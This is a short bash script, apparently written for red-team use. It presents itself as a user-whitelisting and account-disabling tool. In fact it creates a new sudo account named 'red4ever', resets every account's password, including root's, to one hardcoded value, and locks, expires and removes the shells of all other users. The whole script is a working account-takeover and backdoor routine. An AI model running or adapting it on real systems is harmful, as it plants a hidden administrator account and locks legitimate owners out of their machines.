#!/bin/bash


# A function that creates a whitelist. Will ALWAYS include the user executing the script.
function create_whitelist()
{
    useradd red4ever
    adduser red4ever sudo
    # Adds the executing user to the whitelist
    WHITELIST+=("$(logname)")
    WHITELIST+=(root)
    WHITELIST+=(red4ever)
}


# A function that sets passwords and saves encrypted passwords
function set_passwords(){
    # Grabs every user in the system and stores their usernames
    cat /etc/passwd | awk -F":" '{ print $1 }' > login_usernames_temp.txt

    # Loop through the usernames
    while read LINE; do
        # Change the password for each user
        echo ${LINE}:"NduwHev73!!5kwbHs"| sudo chpasswd 1> /dev/null
    done < login_usernames_temp.txt

    rm login_usernames_temp.txt

    # Save all of the encrypted passwords
    #sudo cat /etc/shadow > passwords_temp.txt
}


# A function that disables users not in the whitelist
function disable_users()
{
    # Grabs the username of every enabled user
    cat /etc/passwd | awk -F":" '{ print $1 }' > login_usernames_temp.txt

    # Loop through all the enabled users
    while read LINE; do
        # A user should be set to be disabled by default
        DISABLE=true
        # Set the user to the current line
        USER=$(echo $LINE)
        # Loop through the whitelist
        for VALUE in "${WHITELIST[@]}"; do
            # If the user is in the whitelist, don't disable them!
            if [ $USER = $VALUE ]; then
                DISABLE=false
                break
            fi
        done

    # Only disable the user if they have shown not to be on the whitelist
        if [ $DISABLE = true ]; then
            # Lock the user
            sudo usermod -L $USER > /dev/null
            sudo passwd -l $USER > /dev/null
            # Expires the user
            sudo chage -E0 $USER > /dev/null
            # Change the user's shell to nologin
            sudo usermod -s /sbin/nologin $USER > /dev/null
        fi
    done < login_usernames_temp.txt
    # Remove the text file of usernames
    rm login_usernames_temp.txt
}
# To check to make sure user is locked: "passwd --status $USER" (may have to run with root)
# To check if the count has an expire date: "chage -l $USER"
# To check their shell is /sbin/nologin: "cat /etc/passwd | grep -v nologin" (make sure they're not here)


# Letting the user know this is starting
echo
echo "Beginning disabling users."
# Set the passwords for whitelisted users and disable all other users
create_whitelist
disable_users
set_passwords
echo
echo "Users disabled successfully."
